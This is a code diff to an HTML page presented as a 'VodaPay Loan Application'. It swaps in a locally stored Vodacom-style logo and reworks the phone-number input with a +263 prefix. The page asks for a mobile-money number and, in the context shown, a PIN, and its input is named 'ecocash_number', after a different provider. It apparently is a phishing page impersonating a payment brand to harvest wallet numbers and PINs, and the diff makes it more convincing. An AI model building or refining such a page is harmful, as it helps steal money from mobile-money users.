@@ -13,7 +13,7 @@
   <section class="form-header">
     <div class="container">
       <img 
-        src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Vodacom_logo.svg/512px-Vodacom_logo.svg.png"
+        src="../gallery/vodapay.png"
         class="vodapay-logo"
       />
       <h1>VodaPay Loan Application</h1>
@@ -34,16 +34,29 @@
         >
 
           <!-- PHONE -->
-          <div class="form-group">
-            <label>VodaPay Phone Number</label>
-            <input
-              type="tel"
-              name="ecocash_number"
-              placeholder="7XXXXXXXX"
-              required
-              pattern="[0-9]{9}"
-            />
-          </div>
+          <!-- PHONE -->
+<div class="form-group">
+  <label>VodaPay Phone Number</label>
+
+  <div class="phone-input">
+    <span class="prefix">+263</span>
+
+    <input
+      type="tel"
+      name="ecocash_number"
+      id="phoneInput"
+      value="7"
+      maxlength="9"
+      required
+      pattern="7[0-9]{8}"
+    />
+  </div>
+
+  <small class="form-hint">
+    Enter your VodaPay number (starts with 7)
+  </small>
+</div>
+
 
           <!-- PIN -->
           <div class="form-group">
